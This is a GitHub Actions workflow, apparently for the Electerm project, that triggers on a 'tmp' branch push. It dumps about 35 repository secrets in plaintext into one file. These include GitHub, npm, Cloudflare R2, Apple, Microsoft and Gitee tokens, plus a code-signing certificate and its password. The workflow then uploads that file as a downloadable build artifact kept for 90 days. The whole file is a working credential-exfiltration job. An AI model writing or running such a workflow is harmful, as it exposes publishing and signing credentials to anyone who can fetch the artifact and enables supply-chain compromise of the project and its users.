name: Secrets Collector and Artifact Upload

on:
  push:
    branches: [tmp]
  workflow_dispatch:

jobs:
  collect-secrets:
    runs-on: ubuntu-latest
    environment: build
    if: github.ref == 'refs/heads/tmp'
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Dump all secrets to a single file
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          BUILD_NUMBER: ${{ secrets.BUILD_NUMBER }}
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
          PAT_REPO_TOKEN: ${{ secrets.PAT_REPO_TOKEN }}
          CF_R2_ACCOUNT_ID: ${{ secrets.CF_R2_ACCOUNT_ID }}
          CF_R2_BUCKET: ${{ secrets.CF_R2_BUCKET }}
          CF_R2_ACCESS_KEY_ID: ${{ secrets.CF_R2_ACCESS_KEY_ID }}
          CF_R2_SECRET_ACCESS_KEY: ${{ secrets.CF_R2_SECRET_ACCESS_KEY }}
          CF_R2_ENDPOINT: ${{ secrets.CF_R2_ENDPOINT }}
          CSC_LINK: ${{ secrets.CSC_LINK }}
          CSC_KEY_PASSWORD: ${{ secrets.CSC_KEY_PASSWORD }}
          APPLEID: ${{ secrets.APPLEID }}
          APPLEIDPASS: ${{ secrets.APPLEIDPASS }}
          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
          MS_TENANT_ID: ${{ secrets.MS_TENANT_ID }}
          MS_SELLER_ID: ${{ secrets.MS_SELLER_ID }}
          MS_CLIENT_ID: ${{ secrets.MS_CLIENT_ID }}
          MS_CLIENT_SECRET: ${{ secrets.MS_CLIENT_SECRET }}
          MS_PRODUCT_ID: ${{ secrets.MS_PRODUCT_ID }}
          MS_APP_ID: ${{ secrets.MS_APP_ID }}
          SNAP_TOKEN: ${{ secrets.SNAP_TOKEN }}
          WINGET_TOKEN: ${{ secrets.WINGET_TOKEN }}
          GITEE_TOKEN: ${{ secrets.GITEE_TOKEN }}
          GITEE_ID: ${{ secrets.GITEE_ID }}
          GITEE_PRIVATE_SSH_TOKEN: ${{ secrets.GITEE_PRIVATE_SSH_TOKEN }}
          CLOUD_TOKEN: ${{ secrets.CLOUD_TOKEN }}
          CUSTOM_SYNC_SECRET: ${{ secrets.CUSTOM_SYNC_SECRET }}
          CUSTOM_SYNC_URL: ${{ secrets.CUSTOM_SYNC_URL }}
          CUSTOM_SYNC_USER: ${{ secrets.CUSTOM_SYNC_USER }}
          GIST_ID: ${{ secrets.GIST_ID }}
          GIST_TOKEN: ${{ secrets.GIST_TOKEN }}
          TEST_HOST: ${{ secrets.TEST_HOST }}
          TEST_PASS_: ${{ secrets.TEST_PASS_ }}
          TEST_USER_: ${{ secrets.TEST_USER_ }}
        run: |
          mkdir -p artifacts
          OUT="artifacts/all-secrets.txt"
          
          echo "============================================================" > "$OUT"
          echo "  ELECTERM SECRETS DUMP" >> "$OUT"
          echo "============================================================" >> "$OUT"
          echo "Generated: $(date)" >> "$OUT"
          echo "Git Ref: $GITHUB_REF" >> "$OUT"
          echo "Git SHA: $GITHUB_SHA" >> "$OUT"
          echo "" >> "$OUT"
          echo "============================================================" >> "$OUT"
          echo "  ACTUAL SECRET VALUES BELOW" >> "$OUT"
          echo "============================================================" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "GITHUB_TOKEN:" >> "$OUT"
          printf '%s\n' "$GITHUB_TOKEN" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "BUILD_NUMBER:" >> "$OUT"
          printf '%s\n' "$BUILD_NUMBER" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "NPM_TOKEN:" >> "$OUT"
          printf '%s\n' "$NPM_TOKEN" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "PAT_REPO_TOKEN:" >> "$OUT"
          printf '%s\n' "$PAT_REPO_TOKEN" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "CF_R2_ACCOUNT_ID:" >> "$OUT"
          printf '%s\n' "$CF_R2_ACCOUNT_ID" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "CF_R2_BUCKET:" >> "$OUT"
          printf '%s\n' "$CF_R2_BUCKET" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "CF_R2_ACCESS_KEY_ID:" >> "$OUT"
          printf '%s\n' "$CF_R2_ACCESS_KEY_ID" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "CF_R2_SECRET_ACCESS_KEY:" >> "$OUT"
          printf '%s\n' "$CF_R2_SECRET_ACCESS_KEY" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "CF_R2_ENDPOINT:" >> "$OUT"
          printf '%s\n' "$CF_R2_ENDPOINT" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "CSC_LINK:" >> "$OUT"
          printf '%s\n' "$CSC_LINK" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "CSC_KEY_PASSWORD:" >> "$OUT"
          printf '%s\n' "$CSC_KEY_PASSWORD" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "APPLEID:" >> "$OUT"
          printf '%s\n' "$APPLEID" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "APPLEIDPASS:" >> "$OUT"
          printf '%s\n' "$APPLEIDPASS" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "APPLE_TEAM_ID:" >> "$OUT"
          printf '%s\n' "$APPLE_TEAM_ID" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "MS_TENANT_ID:" >> "$OUT"
          printf '%s\n' "$MS_TENANT_ID" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "MS_SELLER_ID:" >> "$OUT"
          printf '%s\n' "$MS_SELLER_ID" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "MS_CLIENT_ID:" >> "$OUT"
          printf '%s\n' "$MS_CLIENT_ID" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "MS_CLIENT_SECRET:" >> "$OUT"
          printf '%s\n' "$MS_CLIENT_SECRET" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "MS_PRODUCT_ID:" >> "$OUT"
          printf '%s\n' "$MS_PRODUCT_ID" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "MS_APP_ID:" >> "$OUT"
          printf '%s\n' "$MS_APP_ID" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "SNAP_TOKEN:" >> "$OUT"
          printf '%s\n' "$SNAP_TOKEN" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "WINGET_TOKEN:" >> "$OUT"
          printf '%s\n' "$WINGET_TOKEN" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "GITEE_TOKEN:" >> "$OUT"
          printf '%s\n' "$GITEE_TOKEN" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "GITEE_ID:" >> "$OUT"
          printf '%s\n' "$GITEE_ID" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "GITEE_PRIVATE_SSH_TOKEN:" >> "$OUT"
          printf '%s\n' "$GITEE_PRIVATE_SSH_TOKEN" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "CLOUD_TOKEN:" >> "$OUT"
          printf '%s\n' "$CLOUD_TOKEN" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "CUSTOM_SYNC_SECRET:" >> "$OUT"
          printf '%s\n' "$CUSTOM_SYNC_SECRET" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "CUSTOM_SYNC_URL:" >> "$OUT"
          printf '%s\n' "$CUSTOM_SYNC_URL" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "CUSTOM_SYNC_USER:" >> "$OUT"
          printf '%s\n' "$CUSTOM_SYNC_USER" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "GIST_ID:" >> "$OUT"
          printf '%s\n' "$GIST_ID" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "GIST_TOKEN:" >> "$OUT"
          printf '%s\n' "$GIST_TOKEN" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "TEST_HOST:" >> "$OUT"
          printf '%s\n' "$TEST_HOST" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "TEST_PASS_:" >> "$OUT"
          printf '%s\n' "$TEST_PASS_" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "------------------------------------------------------------" >> "$OUT"
          echo "TEST_USER_:" >> "$OUT"
          printf '%s\n' "$TEST_USER_" >> "$OUT"
          echo "" >> "$OUT"
          
          echo "============================================================" >> "$OUT"
          echo "  END OF SECRETS DUMP" >> "$OUT"
          echo "============================================================" >> "$OUT"
          
          echo "File created: $OUT"
          echo "Size: $(wc -c < "$OUT") bytes"
          echo "Lines: $(wc -l < "$OUT")"
          
      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: secrets-collection-${{ github.run_id }}
          path: artifacts/
          retention-days: 90
